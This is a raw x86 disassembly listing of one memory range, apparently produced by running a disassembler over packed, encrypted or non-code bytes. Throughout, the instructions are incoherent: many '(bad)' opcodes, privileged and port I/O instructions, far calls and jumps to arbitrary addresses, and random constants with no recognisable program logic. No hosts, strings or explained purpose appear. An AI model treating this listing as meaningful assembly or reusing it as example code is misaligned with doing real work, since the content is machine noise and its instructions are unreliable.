  41dc1f:	sar    DWORD PTR [ebp+0x4791b401],0x48
  41dc26:	cs jno 0x41dbb5
  41dc29:	mov    ds:0x818f17f3,al
  41dc2e:	loope  0x41dbe1
  41dc30:	inc    eax
  41dc31:	pusha  
  41dc32:	inc    eax
  41dc33:	test   DWORD PTR [edx+0x43],0x6af20fb3
  41dc3a:	mov    eax,0xccb0ee09
  41dc3f:	inc    ebx
  41dc40:	hlt    
	...
  41dcb1:	add    BYTE PTR [eax],al
  41dcb3:	add    BYTE PTR [eax-0x67],ah
  41dcb6:	fsubr  st(5),st
  41dcb8:	std    
  41dcb9:	in     eax,0x79
  41dcbb:	popf   
  41dcbc:	jle    0x41dc59
  41dcbe:	es and al,0xac
  41dcc1:	ds pop edi
  41dcc3:	mov    ds:0x14077,al
  41dcc8:	cmc    
  41dcc9:	add    BYTE PTR [eax],al
  41dccb:	add    BYTE PTR [esi+0x57],ch
  41dcce:	sbb    BYTE PTR [ecx+ebp*1],bl
  41dcd1:	pusha  
  41dcd2:	dec    esp
  41dcd3:	into   
  41dcd4:	cli    
  41dcd5:	fwait
  41dcd6:	pop    ebx
  41dcd7:	pop    ecx
  41dcd8:	cmp    cl,BYTE PTR [ebx+0x5c]
  41dcdb:	jb     0x41dd55
  41dcdd:	mov    bh,0xe2
  41dcdf:	xor    al,0xe8
  41dce1:	dec    eax
  41dce2:	or     BYTE PTR [edi-0x5a60d80c],dl
  41dce8:	mov    ah,0x5
  41dcea:	push   esi
  41dceb:	xor    al,0x3e
  41dced:	popa   
  41dcee:	int3   
  41dcef:	jmp    0xbb0c793f
  41dcf4:	fdiv   DWORD PTR [edi]
  41dcf6:	retf   
  41dcf7:	jecxz  0x41dd48
  41dcf9:	push   0xffffff94
  41dcfb:	push   ebp
  41dcfc:	cmp    al,0xed
  41dcfe:	fbld   TBYTE PTR [ecx]
  41dd00:	cdq    
  41dd01:	aad    0x58
  41dd03:	fsub   st(5),st
  41dd05:	loope  0x41dd49
  41dd07:	nop
  41dd08:	inc    esi
  41dd09:	std    
  41dd0a:	push   es
  41dd0b:	popf   
  41dd0c:	int3   
  41dd0d:	adc    ebx,esi
  41dd0f:	outs   dx,DWORD PTR ds:[esi]
  41dd10:	loop   0x41dcac
  41dd12:	mov    eax,ds:0xa9417db0
  41dd17:	inc    edi
  41dd18:	sbb    edx,esp
  41dd1a:	mov    eax,ds:0x57d53a2b
  41dd1f:	outs   dx,BYTE PTR ds:[esi]
  41dd20:	sti    
  41dd21:	push   esi
  41dd22:	aas    
  41dd23:	ds push ebx
  41dd25:	cmp    dl,dh
  41dd27:	sahf   
  41dd28:	inc    esi
  41dd29:	retf   
  41dd2a:	scas   al,BYTE PTR es:[edi]
  41dd2b:	jmp    0x41dd41
  41dd2d:	push   cs
  41dd2e:	(bad)  
  41dd2f:	loopne 0x41ddaa
  41dd31:	retf   
  41dd32:	push   es
  41dd33:	xchg   ebp,eax
  41dd34:	add    dh,0xc3
  41dd37:	(bad)  
  41dd38:	add    eax,0xbf489cd6
  41dd3d:	push   ds
  41dd3e:	add    eax,0xb404e41b
  41dd43:	fmul   QWORD PTR [edi+0x10]
  41dd46:	stos   BYTE PTR es:[edi],al
  41dd47:	mov    al,ds:0xf47e4711
  41dd4c:	xor    al,0x2c
  41dd4e:	push   ss
  41dd4f:	xchg   edi,eax
  41dd50:	imul   esi,DWORD PTR [ecx-0x2ed85f96],0x89d57fd0
  41dd5a:	and    DWORD PTR [esi-0x4],edi
  41dd5d:	shr    BYTE PTR [edi-0x32],0x79
  41dd61:	xchg   ebp,eax
  41dd62:	fwait
  41dd63:	aaa    
  41dd64:	or     eax,0xb969adf1
  41dd69:	call   0xfe0b:0xa6abbd94
  41dd70:	retf   
  41dd71:	rcl    DWORD PTR [esi],0xf
  41dd74:	xchg   ebp,eax
  41dd75:	xchg   ecx,eax
  41dd76:	pop    esi
  41dd77:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dd79:	xor    eax,0xb4236d4d
  41dd7e:	icebp  
  41dd7f:	pushf  
  41dd80:	sub    esp,edi
  41dd82:	lock fs mov ?,edi
  41dd86:	pxor   mm6,QWORD PTR [esi+0x25]
  41dd8a:	fidiv  WORD PTR [eax-0x156dbf9c]
  41dd90:	popa   
  41dd91:	adc    BYTE PTR [ebp+0x130623d0],bh
  41dd97:	mov    ecx,0x76abc13b
  41dd9c:	sub    BYTE PTR [ebp-0x4b07b510],ch
  41dda2:	sbb    BYTE PTR [edx+0x75de5ecd],bh
  41dda8:	xchg   esp,eax
  41dda9:	xor    BYTE PTR [ecx+0x1044e8e2],ah
  41ddaf:	lds    esi,FWORD PTR [eax]
  41ddb1:	push   ebx
  41ddb2:	sub    al,0xca
  41ddb4:	xor    al,0xe4
  41ddb6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ddb7:	and    edx,DWORD PTR [ebx+0x675b01ef]
  41ddbd:	xor    esp,DWORD PTR ds:0x7901
	...
  41de33:	add    BYTE PTR [edi],al
  41de35:	jp     0x41de1f
  41de37:	jnp    0x41de36
  41de39:	sti    
  41de3a:	xchg   edi,eax
  41de3b:	jle    0x41ddf3
  41de3d:	popf   
  41de3e:	loopne 0x41ddc2
  41de40:	mov    cl,BYTE PTR [eax*8+0x1416c56]
  41de47:	add    ch,dh
  41de49:	add    BYTE PTR [eax],al
  41de4b:	add    al,dl
  41de4d:	push   ecx
  41de4e:	mov    ds:0x95f3c2f7,al
  41de53:	and    eax,0x1b60352d
  41de58:	and    dh,BYTE PTR ss:[edi+0x50]
  41de5c:	shl    BYTE PTR [eax],cl
  41de5e:	push   eax
  41de5f:	jae    0x41de81
  41de61:	mov    edx,esp
  41de63:	mov    ds:0xfa48b97d,al
  41de68:	je     0x41de91
  41de6a:	jb     0x41debb
  41de6c:	fs out dx,eax
  41de6e:	xchg   esp,eax
  41de6f:	and    al,0x3a
  41de71:	sbb    ecx,DWORD PTR [ecx]
  41de73:	cmc    
  41de74:	add    ebx,0xae2c9485
  41de7a:	mov    ecx,DWORD PTR [esi+0x7596875e]
  41de80:	lods   eax,DWORD PTR ds:[esi]
  41de81:	ins    DWORD PTR es:[edi],dx
  41de82:	mov    ecx,0x43dc98e5
  41de87:	(bad)  
  41de88:	in     eax,dx
  41de89:	jp     0x41deee
  41de8b:	pop    es
  41de8c:	les    ecx,FWORD PTR [eax+0x44f5a1a0]
  41de92:	sbb    eax,0xbb5c5601
  41de97:	aas    
  41de98:	lods   eax,DWORD PTR ds:[esi]
  41de99:	inc    ecx
  41de9a:	add    bh,cl
  41de9c:	and    esp,ecx
  41de9e:	mov    BYTE PTR [esi-0x42963237],dh
  41dea4:	aaa    
  41dea5:	xchg   BYTE PTR [ebp+0x5810241e],bl
  41deab:	(bad)  
  41deac:	xchg   ebp,eax
  41dead:	in     eax,0xfe
  41deaf:	sbb    al,0x38
  41deb1:	aad    0xa2
  41deb3:	shr    DWORD PTR [esp+ebp*1+0x2e],cl
  41deb7:	imul   eax,DWORD PTR [ecx+0x63],0x37
  41debb:	je     0x41de7b
  41debd:	pop    esi
  41debe:	out    0xbe,eax
  41dec0:	ins    BYTE PTR es:[edi],dx
  41dec1:	popa   
  41dec2:	into   
  41dec3:	(bad)  
  41dec4:	sbb    DWORD PTR [ecx],edi
  41dec6:	adc    DWORD PTR [edi+0x24],0x5a49543f
  41decd:	je     0x41df1b
  41decf:	jne    0x41deff
  41ded1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ded2:	ds cmp eax,edx
  41ded5:	inc    ebx
  41ded6:	shl    BYTE PTR [edi-0x46],1
  41ded9:	or     al,0x8
  41dedb:	out    0x54,eax
  41dedd:	in     al,0x84
  41dedf:	pop    ecx
  41dee0:	ret    
  41dee1:	loop   0x41def2
  41dee3:	dec    ecx
  41dee4:	rcl    BYTE PTR [ebp+0x6dfbcd8],cl
  41deea:	in     eax,dx
  41deeb:	xchg   ebx,ebx
  41deed:	mov    ds:0x5a5aecab,eax
  41def2:	and    ch,BYTE PTR [edi-0x23]
  41def5:	outs   dx,BYTE PTR ds:[esi]
  41def6:	aam    0xca
  41def8:	fild   DWORD PTR [ecx-0x7d]
  41defb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41defc:	jmp    DWORD PTR [ecx-0x1c]
  41deff:	lea    ecx,[esi]
  41df01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41df02:	std    
  41df03:	and    ax,WORD PTR [eax-0x5e]
  41df07:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41df08:	dec    ecx
  41df09:	jge    0x41deeb
  41df0b:	inc    ebx
  41df0c:	xchg   DWORD PTR [ebp-0x8],ebp
  41df0f:	sbb    eax,0x47aa195d
  41df14:	jle    0x41df29
  41df16:	(bad)  
  41df17:	cdq    
  41df18:	xor    eax,0xc51475d1
  41df1d:	out    0x11,al
  41df1f:	mov    WORD PTR [edx-0x7c],cs
  41df22:	test   BYTE PTR [edi+0xd],bh
  41df25:	pop    ebx
  41df26:	sti    
  41df27:	cmp    ah,BYTE PTR [esi]
  41df29:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41df2a:	push   ebp
  41df2b:	popa   
  41df2c:	arpl   WORD PTR [esi-0x10cb52be],bp
  41df32:	adc    al,0xaa
  41df34:	adc    al,0x74
  41df36:	and    ebx,DWORD PTR [ebp+edi*8+0x1b268313]
  41df3d:	push   eax
  41df3e:	ds imul ebx,edi,0x0
	...
  41dfb2:	add    BYTE PTR [eax],al
  41dfb4:	mov    ecx,0xad432034
  41dfb9:	push   edi
  41dfba:	sti    
  41dfbb:	(bad)  
  41dfbc:	loopne 0x41df65
  41dfbe:	cmp    ebx,DWORD PTR [esi]
  41dfc0:	stc    
  41dfc1:	mov    dl,0xf8
  41dfc3:	(bad)  
  41dfc4:	popa   
  41dfc5:	inc    edx
  41dfc6:	add    DWORD PTR [eax],eax
  41dfc8:	cmc    
  41dfc9:	add    BYTE PTR [eax],al
  41dfcb:	add    BYTE PTR [ecx+0x3a],cl
  41dfce:	cmp    eax,DWORD PTR [edi]
  41dfd0:	rcl    BYTE PTR [edi],1
  41dfd2:	xrelease xchg DWORD PTR ds:0xe3751a9d,esp
  41dfd9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dfda:	dec    ecx
  41dfdb:	push   ebp
  41dfdc:	inc    ecx
  41dfdd:	jne    0x41e02f
  41dfdf:	xchg   DWORD PTR [edx-0x1fe1d597],ebx
  41dfe5:	rol    DWORD PTR ds:0x8f854648,0x5c
  41dfec:	sub    esi,DWORD PTR [eax+0x60]
  41dfef:	dec    edx
  41dff0:	aaa    
  41dff1:	sbb    al,0x29
  41dff3:	xor    al,BYTE PTR [edx+ebx*2]
  41dff6:	xchg   edi,eax
  41dff7:	mov    al,0x53
  41dff9:	test   DWORD PTR [esi+0x7b],eax
  41dffc:	call   0x1f42:0x6c297c97
  41e003:	cmp    DWORD PTR [edx+0x6f],edi
  41e006:	mov    cl,0x9c
  41e008:	sar    DWORD PTR [ebx+0x3],0xf5
  41e00c:	into   
  41e00d:	or     BYTE PTR [esi+0x795dc12e],dh
  41e013:	lahf   
  41e014:	and    esi,0x51
  41e017:	int3   
  41e018:	sub    cl,BYTE PTR [esi-0x4fbb34e2]
  41e01e:	stc    
  41e01f:	mov    ch,0x17
  41e021:	xor    al,0x19
  41e023:	push   0x6903ebf0
  41e028:	adc    DWORD PTR [ebp+0xe],edx
  41e02b:	and    BYTE PTR [eax-0x3d],ch
  41e02e:	mov    ebp,0xb6ceeea
  41e033:	das    
  41e034:	sub    dh,bh
  41e036:	mov    esi,0xe40f4bbd
  41e03b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e03c:	sahf   
  41e03d:	or     DWORD PTR [edx],edx
  41e03f:	mov    dl,0xc5
  41e041:	(bad)  
  41e042:	clc    
  41e043:	shl    BYTE PTR [edx],1
  41e045:	addr16 and dl,bl
  41e048:	add    DWORD PTR cs:[edi-0x2874b20f],0x6b
  41e050:	mov    ecx,0xd8496ef0
  41e055:	shr    esp,cl
  41e057:	jne    0x41e083
  41e059:	fcomi  st,st(2)
  41e05b:	cwde   
  41e05c:	pop    eax
  41e05d:	retf   
  41e05e:	cmp    BYTE PTR [ecx-0x27],0xcf
  41e062:	push   ss
  41e063:	xor    BYTE PTR [ecx+0x5aa6d0d1],dh
  41e069:	inc    edx
  41e06a:	adc    ah,al
  41e06c:	fs mov eax,0xed36f7f2
  41e072:	xchg   cl,ah
  41e074:	aad    0x6a
  41e076:	jl     0x41e0a0
  41e078:	lds    si,DWORD PTR [eax-0x69]
  41e07c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e07d:	ins    BYTE PTR es:[edi],dx
  41e07e:	sub    DWORD PTR [edx],0x6a422e00
  41e084:	std    
  41e085:	icebp  
  41e086:	adc    al,0x6
  41e088:	call   0x64c1e8a8
  41e08d:	cwde   
  41e08e:	lods   eax,DWORD PTR ds:[esi]
  41e08f:	bound  esp,QWORD PTR [edx+0x6e]
  41e092:	inc    edi
  41e094:	and    al,0x7f
  41e096:	push   ebx
  41e097:	fisubr WORD PTR [esi+0x26]
  41e09a:	lock lods al,BYTE PTR ds:[esi]
  41e09c:	call   0x43f43637
  41e0a1:	mov    ss,WORD PTR [edx-0x27]
  41e0a4:	sbb    al,0x26
  41e0a6:	pop    esp
  41e0a7:	xor    ecx,ebp
  41e0a9:	popf   
  41e0aa:	outs   dx,BYTE PTR ds:[esi]
  41e0ab:	pushf  
  41e0ac:	das    
  41e0ad:	jns    0x41e06b
  41e0af:	jge    0x41e05b
  41e0b1:	inc    ebp
  41e0b2:	daa    
  41e0b3:	add    BYTE PTR [ecx+0x4c659543],bl
  41e0b9:	push   esi
  41e0ba:	lds    esp,FWORD PTR [ecx+0x58cf8555]
  41e0c0:	mov    eax,0x0
	...
  41e131:	add    BYTE PTR [eax],al
  41e133:	add    BYTE PTR [eax-0x3d],dl
  41e136:	cmp    ecx,DWORD PTR ds:0xdf76fdbb
  41e13c:	and    al,0x13
  41e13e:	push   ss
  41e13f:	dec    edi
  41e140:	les    esp,FWORD PTR [eax]
  41e142:	xor    bh,BYTE PTR [edi+0x14356]
  41e148:	cmc    
  41e149:	add    BYTE PTR [eax],al
  41e14b:	add    BYTE PTR [edi+eiz*4+0x3d],cl
  41e14f:	jno    0x41e131
  41e151:	les    esi,FWORD PTR [ebp+0xc]
  41e154:	add    eax,0xc1b566ff
  41e159:	dec    ebx
  41e15a:	pop    es
  41e15b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e15c:	test   DWORD PTR [ecx],edx
  41e15e:	inc    edi
  41e15f:	mov    esp,0xb98d723c
  41e164:	mov    al,ds:0x4dea3f21
  41e169:	mov    ah,0x50
  41e16b:	mov    ebx,ebp
  41e16d:	arpl   di,bx
  41e16f:	mov    cl,0x39
  41e171:	xchg   ebx,eax
  41e172:	les    edi,FWORD PTR [edi+0x19]
  41e175:	mov    DWORD PTR [ebx+0x5a],0x4c917d3b
  41e17c:	ja     0x41e19c
  41e17e:	and    al,0xb2
  41e180:	xor    eax,0x78073eab
  41e185:	pop    ss
  41e186:	xor    DWORD PTR [ebp+0x4b],0xffffff90
  41e18a:	dec    eax
  41e18b:	loop   0x41e1fe
  41e18d:	stos   BYTE PTR es:[edi],al
  41e18e:	data16 outs dx,BYTE PTR ds:[esi]
  41e190:	adc    cl,ah
  41e192:	(bad)  
  41e193:	icebp  
  41e194:	or     BYTE PTR [edx-0x77],0x8b
  41e198:	repnz retf 
  41e19a:	pop    edx
  41e19b:	add    DWORD PTR [ecx+0x43],edx
  41e19e:	add    eax,0x74e448cd
  41e1a3:	mov    dh,0xe8
  41e1a5:	mov    ecx,0x8f38bc19
  41e1aa:	test   eax,0x3847af81
  41e1b0:	xor    BYTE PTR [edi+eax*4],bl
  41e1b3:	loopne 0x41e17e
  41e1b5:	pop    ebx
  41e1b6:	fst    QWORD PTR [ebx]
  41e1b8:	mov    ebp,esi
  41e1ba:	add    bh,0x73
  41e1bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e1be:	add    ch,BYTE PTR [ebp-0x1e995b19]
  41e1c4:	out    0x5d,al
  41e1c6:	pop    edi
  41e1c7:	in     al,0xd5
  41e1c9:	jmp    0xc7463378
  41e1ce:	(bad)  [ecx-0x62]
  41e1d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e1d2:	or     edx,esp
  41e1d4:	std    
  41e1d5:	iret   
  41e1d6:	xor    DWORD PTR [esi],ebp
  41e1d8:	es xor eax,0x1ad7f232
  41e1de:	add    dh,cl
  41e1e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e1e1:	pop    ecx
  41e1e2:	mov    bl,0xe0
  41e1e4:	xor    esi,0xffffff8e
  41e1e7:	pop    esp
  41e1e8:	jmp    0x7384:0xdabd2a52
  41e1ef:	cmp    DWORD PTR [eax-0x13],edi
  41e1f2:	push   ebx
  41e1f3:	xor    eax,0xb2616437
  41e1f8:	repz sbb ah,BYTE PTR [eax]
  41e1fb:	mov    cl,0x4e
  41e1fd:	jge    0x41e24a
  41e1ff:	dec    esp
  41e200:	inc    eax
  41e201:	pop    esp
  41e202:	cli    
  41e203:	out    0x98,al
  41e205:	mov    bl,0xb0
  41e207:	xor    eax,0x4b9c4523
  41e20c:	stos   DWORD PTR es:[edi],eax
  41e20d:	inc    BYTE PTR [esp+eiz*8]
  41e210:	xor    al,BYTE PTR [eax+0x6c]
  41e213:	ret    
  41e214:	xchg   esp,eax
  41e215:	arpl   WORD PTR [ebp+0x8],bx
  41e218:	pop    ecx
  41e219:	cmp    BYTE PTR [eax-0x34],dl
  41e21c:	outs   dx,BYTE PTR ds:[esi]
  41e21d:	sbb    al,0x43
  41e21f:	cli    
  41e220:	lods   al,BYTE PTR ds:[esi]
  41e221:	sbb    DWORD PTR [edx],esi
  41e223:	les    edx,FWORD PTR [esi]
  41e225:	adc    eax,0xf97ea796
  41e22a:	rcl    BYTE PTR [eax+0x26],1
  41e22d:	sub    DWORD PTR [edi-0x3b],edx
  41e230:	shl    DWORD PTR [edx+0x0],0x65
  41e234:	inc    ebx
  41e235:	cld    
  41e236:	data16 jbe 0x41e1f8
  41e239:	pushf  
  41e23a:	mov    edi,0x38254f82
  41e23f:	cmp    al,BYTE PTR cs:[eax]
	...
  41e2b2:	add    BYTE PTR [eax],al
  41e2b4:	inc    BYTE PTR [eax+0x7dff54f9]
  41e2ba:	jmp    FWORD PTR [edx+0x7b6356a5]
  41e2c0:	scas   al,BYTE PTR es:[edi]
  41e2c1:	pop    ds
  41e2c2:	data16 ins BYTE PTR es:[edi],dx
  41e2c4:	dec    ebx
  41e2c5:	inc    esp
  41e2c6:	add    DWORD PTR [eax],eax
  41e2c8:	cmc    
  41e2c9:	add    BYTE PTR [eax],al
  41e2cb:	add    BYTE PTR [ebx+0x48f294c4],ch
  41e2d1:	fcomp  QWORD PTR [ebx+0x376bcfa7]
  41e2d7:	lea    ecx,[edi]
  41e2d9:	and    bl,0x85
  41e2dc:	adc    DWORD PTR [edx+0x4a39aebc],esi
  41e2e2:	add    BYTE PTR ds:0x9c7a6481,bl
  41e2e8:	loop   0x41e2a6
  41e2ea:	cwde   
  41e2eb:	test   eax,0x383d9be7
  41e2f0:	or     eax,0x4eacf28b
  41e2f5:	xchg   ebx,eax
  41e2f6:	and    ecx,ebp
  41e2f8:	jge    0x41e2ca
  41e2fa:	das    
  41e2fb:	jecxz  0x41e30e
  41e2fd:	dec    esi
  41e2fe:	mov    edi,0x5736a9cd
  41e303:	ror    cl,cl
  41e305:	rcr    ch,cl
  41e307:	sbb    eax,0xb8edeecf
  41e30c:	mov    esp,0x91d33af5
  41e311:	add    ebx,ecx
  41e313:	jae    0x41e2b7
  41e315:	iret   
  41e316:	(bad)  
  41e317:	aaa    
  41e318:	inc    esp
  41e319:	scas   eax,DWORD PTR es:[edi]
  41e31a:	jge    0x41e381
  41e31c:	addr16 call 0x3fdebcfe
  41e322:	jmp    0x41e31d
  41e324:	pop    ds
  41e325:	fidivr DWORD PTR [eax-0x59ffdda3]
  41e32b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e32c:	cmp    BYTE PTR [eax],bh
  41e32e:	xchg   esp,eax
  41e32f:	repnz shr DWORD PTR [esi-0x7da2b42],1
  41e336:	inc    eax
  41e337:	fadd   st,st(5)
  41e339:	(bad)  
  41e33a:	push   ebp
  41e33b:	jns    0x41e373
  41e33d:	(bad)  
  41e33e:	jbe    0x41e2e0
  41e340:	mov    al,ds:0xd86601d8
  41e345:	(bad)  
  41e347:	pop    ebp
  41e348:	jle    0x41e335
  41e34a:	xchg   edi,eax
  41e34b:	mov    dh,0xd9
  41e34d:	ja     0x41e396
  41e34f:	mov    esp,fs
  41e351:	lods   al,BYTE PTR ds:[esi]
  41e352:	mov    DWORD PTR [esi-0x6dec881a],eax
  41e358:	cmp    eax,0xee72efe7
  41e35d:	test   al,0x96
  41e35f:	push   0x7
  41e361:	mov    DWORD PTR [ecx],edx
  41e363:	imul   ebp,ebx,0xffffffe2
  41e366:	mov    al,BYTE PTR [eax*2+0x199ac04e]
  41e36d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e36e:	sub    BYTE PTR [edx-0x12e608cb],dl
  41e374:	loop   0x41e3a3
  41e376:	pop    ebp
  41e377:	push   ebx
  41e378:	ret    
  41e379:	icebp  
  41e37a:	out    0xd4,eax
  41e37c:	ins    DWORD PTR es:[edi],dx
  41e37d:	push   esi
  41e37e:	and    BYTE PTR [esi-0x7],bl
  41e381:	cmp    BYTE PTR [esi-0x46a6ed67],cl
  41e387:	inc    eax
  41e388:	test   ch,al
  41e38a:	jb     0x41e394
  41e38c:	les    ebx,FWORD PTR [edi-0x66]
  41e38f:	in     eax,0x49
  41e391:	out    dx,al
  41e392:	stc    
  41e393:	or     ecx,DWORD PTR ds:0x777ae610
  41e399:	cli    
  41e39a:	stos   DWORD PTR es:[edi],eax
  41e39b:	dec    esp
  41e39c:	add    ebp,DWORD PTR [eax-0x70]
  41e39f:	int3   
  41e3a0:	jp     0x41e385
  41e3a2:	inc    eax
  41e3a3:	dec    ebp
  41e3a4:	pop    ds
  41e3a5:	jmp    0x5044d1c1
  41e3aa:	inc    ecx
  41e3ab:	or     ebp,DWORD PTR [ecx-0x52bd2f37]
  41e3b1:	sub    eax,0xfb2eadfa
  41e3b6:	pop    es
  41e3b7:	push   0x93373529
  41e3bc:	or     BYTE PTR [ebx],dl
  41e3be:	or     al,0xbe
  41e3c0:	daa    
	...
  41e431:	add    BYTE PTR [eax],al
  41e433:	add    dh,dh
  41e435:	rcl    BYTE PTR ss:[edx+edx*8+0x1576f6f4],cl
  41e43d:	mov    ds:0xf03cfead,al
  41e442:	inc    ebx
  41e443:	bound  eax,QWORD PTR [eax+0x45]
  41e446:	add    DWORD PTR [eax],eax
  41e448:	cmc    
  41e449:	add    BYTE PTR [eax],al
  41e44b:	add    dh,bh
  41e44d:	cwde   
  41e44e:	add    al,0x6d
  41e450:	loope  0x41e47c
  41e452:	loop   0x41e41f
  41e454:	xchg   ebp,eax
  41e455:	sub    dh,BYTE PTR [ebx-0x71]
  41e458:	inc    ecx
  41e459:	push   0xc
  41e45b:	cmp    ah,BYTE PTR [edi]
  41e45d:	push   es
  41e45e:	clc    
  41e45f:	mov    ah,0x83
  41e461:	in     eax,0x82
  41e463:	or     ch,BYTE PTR ds:0xbe512ffb
  41e469:	jp     0x41e45d
  41e46b:	mov    DWORD PTR ds:0x16d3872d,ecx
  41e471:	adc    al,0x75
  41e473:	sbb    al,0x31
  41e475:	enter  0xb68d,0x7
  41e479:	jl     0x41e4ae
  41e47b:	imul   eax,DWORD PTR [ecx+0x7],0xe53691b8
  41e482:	fisttp WORD PTR [ebx-0x6d5fccf8]
  41e488:	jbe    0x41e4b1
  41e48a:	fsubr  DWORD PTR [edi+0x711ba371]
  41e490:	outs   dx,BYTE PTR ds:[esi]
  41e491:	xchg   ebx,eax
  41e492:	pusha  
  41e493:	push   ebx
  41e494:	fdivp  st(6),st
  41e496:	test   BYTE PTR [edx+0x6007ee5c],dl
  41e49c:	cmp    al,0x65
  41e49e:	mov    ecx,0xd5a165f7
  41e4a3:	and    DWORD PTR [edi],ebp
  41e4a5:	mov    bh,0xdd
  41e4a7:	imul   eax,DWORD PTR [ebp+0x7b],0xe22f5e56
  41e4ae:	cs stos DWORD PTR es:[edi],eax
  41e4b0:	and    dl,cl
  41e4b2:	loopne 0x41e43e
  41e4b4:	add    al,0x90
  41e4b6:	addr16 out 0x0,eax
  41e4b9:	fst    DWORD PTR [ebx+0x1eafa858]
  41e4bf:	jbe    0x41e47d
  41e4c1:	pusha  
  41e4c2:	outs   dx,BYTE PTR ds:[esi]
  41e4c3:	pop    ebx
  41e4c4:	dec    edx
  41e4c5:	imul   edi,DWORD PTR [eax-0x5fef4a81],0xffffffcb
  41e4cc:	push   es
  41e4cd:	push   ebx
  41e4ce:	mov    dl,0x2e
  41e4d0:	dec    eax
  41e4d1:	cmp    edx,eax
  41e4d3:	push   0xe83a9857
  41e4d8:	fistp  DWORD PTR [ecx+0x67562406]
  41e4de:	div    DWORD PTR [ebp+0x39a4f13c]
  41e4e4:	and    ecx,edi
  41e4e6:	sbb    eax,0xca0d67d8
  41e4eb:	stos   BYTE PTR es:[edi],al
  41e4ec:	sbb    ch,BYTE PTR [esp+edx*4-0x5ebdb02a]
  41e4f3:	jns    0x41e531
  41e4f5:	ss sbb al,0x46
  41e4f8:	sti    
  41e4f9:	daa    
  41e4fa:	call   0x5b71:0x5ecb9f8a
  41e501:	ror    DWORD PTR [edi-0x58],1
  41e504:	mov    ebp,0xdc86331e
  41e509:	adc    al,0x2b
  41e50b:	push   ecx
  41e50c:	std    
  41e50d:	pop    es
  41e50e:	xor    ch,BYTE PTR [ebp-0x17ed742a]
  41e514:	xor    DWORD PTR [eax+0x5b],esp
  41e517:	jge    0x41e4e6
  41e519:	mov    eax,0xeeef9384
  41e51e:	xchg   edx,eax
  41e51f:	xlat   BYTE PTR ds:[ebx]
  41e520:	cmp    ecx,edi
  41e522:	push   cs
  41e523:	adc    al,0x1a
  41e525:	jg     0x41e4d8
  41e527:	jnp    0x41e4e7
  41e529:	sub    eax,0xee53f23
  41e52e:	mov    ebp,DWORD PTR [eax+0x3]
  41e531:	inc    ebp
  41e532:	in     eax,dx
  41e533:	add    ah,dl
  41e535:	mov    eax,DWORD PTR [eax+ebx*2-0x5c]
  41e539:	addr16 mov ch,0xe1
  41e53c:	xchg   edx,eax
  41e53d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e53e:	sub    BYTE PTR [ecx],0xe1
	...
  41e5b1:	add    BYTE PTR [eax],al
  41e5b3:	add    BYTE PTR [ecx+ebx*4+0x4c],bh
  41e5b7:	jbe    0x41e5a6
  41e5b9:	idiv   DWORD PTR [esi-0x65]
  41e5bc:	ss adc al,0xc3
  41e5bf:	repz and BYTE PTR [edi+0x5],dh
  41e5c3:	dec    ecx
  41e5c4:	xor    eax,0xf5000146
  41e5c9:	add    BYTE PTR [eax],al
  41e5cb:	add    BYTE PTR [ebp-0x71],ah
  41e5ce:	retw   0x2416
  41e5d2:	cmp    edx,0xd
  41e5d5:	and    BYTE PTR [esp+ecx*4-0x5789f5bc],dl
  41e5dc:	es push ss
  41e5de:	sub    eax,0x4433c7b7
  41e5e3:	in     al,dx
  41e5e4:	ds mov ch,0x5f
  41e5e7:	or     BYTE PTR [esi],cl
  41e5e9:	xor    al,0x3d
  41e5eb:	add    eax,0x4a5d3ba6
  41e5f0:	icebp  
  41e5f1:	mov    edx,0x709c4920
  41e5f6:	out    0xbd,eax
  41e5f8:	add    DWORD PTR [esi],edx
  41e5fa:	popa   
  41e5fb:	aaa    
  41e5fc:	ror    BYTE PTR [eax],1
  41e5fe:	and    DWORD PTR [edi-0x1589a226],edx
  41e604:	or     BYTE PTR [ebx],dh
  41e606:	push   eax
  41e607:	pop    ecx
  41e608:	out    0x93,al
  41e60a:	lods   al,BYTE PTR ds:[esi]
  41e60b:	aas    
  41e60c:	fwait
  41e60d:	push   ebx
  41e60e:	test   dh,0xb2
  41e611:	push   ds
  41e612:	cmp    ebx,DWORD PTR [ebp+ecx*4-0x13]
  41e616:	mov    esp,0xbc70289d
  41e61b:	mov    bl,0x4e
  41e61d:	sbb    al,0xcf
  41e61f:	rcr    BYTE PTR [eax-0x5378a830],0xa5
  41e626:	push   ebx
  41e627:	je     0x41e666
  41e629:	fdiv   DWORD PTR [esi-0x74caaa5a]
  41e62f:	adc    al,0xd0
  41e631:	mov    edx,0x6b5ac06e
  41e636:	repnz and eax,0xe069b570
  41e63c:	or     al,BYTE PTR [ebx+0x37aa31ee]
  41e642:	es mov ecx,0x73b1cb92
  41e648:	pushf  
  41e649:	fimul  DWORD PTR [edi]
  41e64b:	dec    esi
  41e64c:	cmc    
  41e64d:	fdiv   DWORD PTR [esi-0x66]
  41e650:	dec    ebx
  41e651:	lock mov ss,esi
  41e654:	scas   eax,DWORD PTR es:[edi]
  41e655:	cmp    al,0x91
  41e657:	lahf   
  41e658:	sub    DWORD PTR [esi+0x25],0x6f
  41e65c:	mov    ch,0x3
  41e65e:	loopne 0x41e5ee
  41e660:	and    ebp,DWORD PTR [edx-0x597596bf]
  41e666:	and    BYTE PTR [edi],bl
  41e668:	sbb    BYTE PTR [ecx+0x3a],dh
  41e66b:	mov    ds:0xcf972e23,eax
  41e670:	fmulp  st(6),st
  41e672:	cmp    dh,0xa
